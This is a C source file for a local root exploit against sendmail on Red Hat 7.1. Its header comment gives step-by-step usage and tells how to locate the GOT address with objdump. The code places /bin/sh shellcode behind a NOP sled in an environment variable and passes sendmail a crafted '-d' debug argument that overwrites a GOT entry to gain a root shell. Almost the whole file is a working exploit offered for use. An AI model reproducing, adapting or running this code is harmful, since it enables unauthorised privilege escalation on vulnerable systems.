/*
 * rh71sm8.c   (RED HAT 7.1 SENDMAIL EXPLOIT)
 *
 * thanks, grange, for the original.
 *
 * Use objdump to find GOT:
 * $ objdump -R /usr/sbin/sendmail |grep setuid
 * 0809e07c R_386_JUMP_SLOT   setuid
 * ^^^^^^^^^ GOT
 *
 * Probably you should play with offs to make exploit work.
 * 
 * To get root type ./rh71sm8 1000 and then press Ctrl+C.
 * 
 *
 */

#include <sys/types.h>
#include <stdlib.h>

#define OFFSET 1000
#define VECT 0x080ca160
#define GOT 0x080ad8d0

#define NOPNUM 1024

int offs = 0;

char shellcode[] =
  "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
  "\xb0\x2e\xcd\x80\xeb\x15\x5b\x31"
  "\xc0\x88\x43\x07\x89\x5b\x08\x89"
  "\x43\x0c\x8d\x4b\x08\x31\xd2\xb0"
  "\x0b\xcd\x80\xe8\xe6\xff\xff\xff" "/bin/sh";

unsigned int
get_esp ()
{
  __asm__ ("movl %esp,%eax");
}

int
main (int argc, char *argv[])
{
  char *egg, s[256], tmp[256], *av[3], *ev[2];
  unsigned int got = GOT, vect = VECT, ret, first, last, i;

  egg = (char *) malloc (strlen (shellcode) + NOPNUM + 5);
  if (egg == NULL)
  {
    perror ("malloc()");
    exit (-1);
  }
  sprintf (egg, "EGG=");
  memset (egg + 4, 0x90, NOPNUM);
  sprintf (egg + 4 + NOPNUM, "%s", shellcode);

  offs = atoi (argv[1]);

  ret = get_esp () + offs;

  sprintf (s, "-d");
  first = -vect - (0xffffffff - got + 1);
  last = first;
  while (ret)
  {
    i = ret & 0xff;
    sprintf (tmp, "%u-%u.%u-", first, last, i);
    strcat (s, tmp);
    last = ++first;
    ret = ret >> 8;
  }
  s[strlen (s) - 1] = '\0';

  av[0] = "/usr/sbin/sendmail";
  av[1] = s;
  av[2] = NULL;
  ev[0] = egg;
  ev[1] = NULL;
  execve (*av, av, ev);
}

